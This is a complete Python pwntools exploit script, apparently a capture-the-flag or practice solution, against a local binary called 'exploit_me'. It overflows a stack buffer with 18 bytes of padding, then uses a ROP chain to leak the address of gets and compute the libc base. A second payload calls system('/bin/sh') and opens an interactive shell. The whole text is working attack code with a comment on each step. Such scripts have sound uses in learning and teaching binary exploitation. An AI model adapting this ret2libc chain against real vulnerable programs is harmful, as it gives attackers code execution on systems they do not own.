from pwn import *

log.info('Loading...')
context.binary = binary = './exploit_me' #Setting the target binary
elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #Loading libc

p = process()
log.info('File processed, creating ROP chain')
padding = b'A'*18 #Creating padding to overflow the buffer
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) #Looking for the first instance of "pop rdi ret" in the output
payload += p64(elf.got.gets) #Returns address of gets function
payload += p64(elf.plt.puts) #Returns address of puts function
payload += p64(elf.symbols.main) #Returns address of the main function
log.info('Sending ROP chain payload')
p.recvline()
p.sendline(payload) #Sending first payload
p.recvline()

leak = u64(p.recvline().strip().ljust(8,b'\0')) #Formatting the data we got

p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets #Calculating base address
log.info(f'Libc base => {hex(libc.address)}')
log.info('Creating final payload')
payload = padding #Creating final payload
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) #Looking for the first instance of "pop rdi ret" in the output again
payload += p64(next(libc.search(b'/bin/sh'))) #Returns address for /bin/sh string
payload += p64(rop.find_gadget(['ret'])[0]) #For stack alignment purposes
payload += p64(libc.symbols.system) #Retuns address of the system function
log.info('Sending payload...')
p.sendline(payload) #Sending final payload
p.recvline()
p.interactive() #Used for shell
